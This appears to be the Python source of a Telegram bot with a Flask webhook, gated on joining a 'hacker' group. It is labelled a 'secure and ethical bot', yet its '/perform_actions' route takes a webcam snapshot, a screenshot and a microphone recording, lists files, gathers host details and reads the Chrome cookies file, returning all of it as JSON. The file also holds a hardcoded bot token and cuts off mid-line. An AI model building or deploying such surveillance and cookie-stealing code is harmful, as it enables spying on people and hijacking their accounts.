import os
import cv2
import telebot
from flask import Flask, request, jsonify
import platform
import pyaudio
import wave

API_TOKEN = '6945433492:AAHPvr6R1tqKiyyzAtZ2N2kcOy6AncEe5QY'
WEBHOOK_URL = 'https://webhk-d5da2f72897e.herokuapp.com/'  # Replace with your actual Heroku app URL
OWNER_ID = 5460343986
FORCE_JOIN_GROUP = '@indian_hacker_group'

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)

authorized_users = {OWNER_ID}

def is_authorized(user_id):
    if user_id in authorized_users:
        return True
    try:
        chat_member = bot.get_chat_member(FORCE_JOIN_GROUP, user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except:
        return False

@app.route('/')
def index():
    return "Hello, this is a secure and ethical bot."

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, "Welcome to the Secure Bot! Use /generate_link to get a link.")
    else:
        bot.reply_to(message, f"You need to join {FORCE_JOIN_GROUP} to use this bot.")
        bot.send_message(message.chat.id, f"Join our group: {FORCE_JOIN_GROUP}")

@bot.message_handler(commands=['generate_link'])
def generate_link(message):
    if is_authorized(message.from_user.id):
        bot.reply_to(message, f"Visit this link to perform actions: {WEBHOOK_URL}/perform_actions")
    else:
        bot.reply_to(message, f"You need to join {FORCE_JOIN_GROUP} to use this bot.")
        bot.send_message(message.chat.id, f"Join our group: {FORCE_JOIN_GROUP}")

@app.route('/perform_actions')
def perform_actions():
    result = {}

    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite('snapshot.png', frame)
        result['snapshot'] = "Snapshot taken and saved!"
    else:
        result['snapshot'] = "Failed to take snapshot."
    cap.release()

    files = os.listdir('.')
    result['files'] = files

    os.system('screencapture screenshot.png')
    result['screenshot'] = "Screenshot taken and saved!"

    chunk = 1024
    sample_format = pyaudio.paInt16
    channels = 2
    fs = 44100
    seconds = 5
    filename = "output.wav"

    p = pyaudio.PyAudio()
    stream = p.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
    frames = []

    for i in range(0, int(fs / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(filename, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(sample_format))
    wf.setframerate(fs)
    wf.writeframes(b''.join(frames))
    wf.close()

    result['audio_recording'] = "Audio recorded!"

    info = {
        "platform": platform.system(),
        "platform_release": platform.release(),
        "platform_version": platform.version(),
        "architecture": platform.machine(),
        "hostname": platform.node(),
        "processor": platform.processor()
    }
    result['system_info'] = info

    cookies_file = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Cookies'
    if os.path.exists(cookies_file):
        with open(cookies_file, 'rb') as file:
            result['cookies'] = file.read()
    else:
        result['cookies'] = "Cookies file not found."

    return jsonify(result)

@bot.message_handler(commands=['add_user'])
def add_user(message):
    if message.from_user.id == OWNER_ID:
        try:
            user_id = int(message.text.split()[1])
            authorized_users.add(user_id)
            bot.reply_to(message, f"User {user_id} added to authorized users.")
        except (IndexError, ValueError):
            bot.reply_to(message, "Usage: /add_user <user_id>")
    else:
        bot.reply_to(message, "You are not authorized to add users.")

@bot.message_handler(commands=['remove_user'])
def remove_user(message):
    if message.from_user.id == OWNER_ID:
        try:
            user_id = int(message.text.split()[1])
            authorized_users.discard(user_id)
            bot.reply_to(message, f"User {user_id} removed from authorized users.")
        except (IndexError, ValueError):
            bot.reply_to(message, "Usage: /remove_user <user_id>")
    else:
        bot.reply_to(message, "You are not authorized to remove users.")

@bot.message_handler(commands=['list_users'])
def list_users(message):
    if message.from_user.id == OWNER_ID:
        users_list = '\n'.join(map(str, authorized_users))
        bot.reply_to(message, f"Authorized users:\n{users_list}")
    else:
        bot.reply_to(message, "You are not authorized to list users.")

@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    if message.from_user.id == OWNER_ID:
        broadcast_message = message.text[len('/broadcast '):]
        for user_id in authorized_users:
            try:
                bot.send_message(user_id, broadcast_message)
            except Exception as e:
                print(f"Failed to send message to {user_id}: {e}")
    else:
        bot.reply_to(message, "You are not authorized to broadcast messages.")

bot.remove_webhook()
bot.set_webhook(url=f"{WEBHOOK_URL}/{API_TOKEN}")

@app.route(f'/{API_TOKEN}', methods=['POST'])
def telegram_webhook():
    json_str = request.get_data().decode('UTF-8')
    update = telebot.types.Update.d
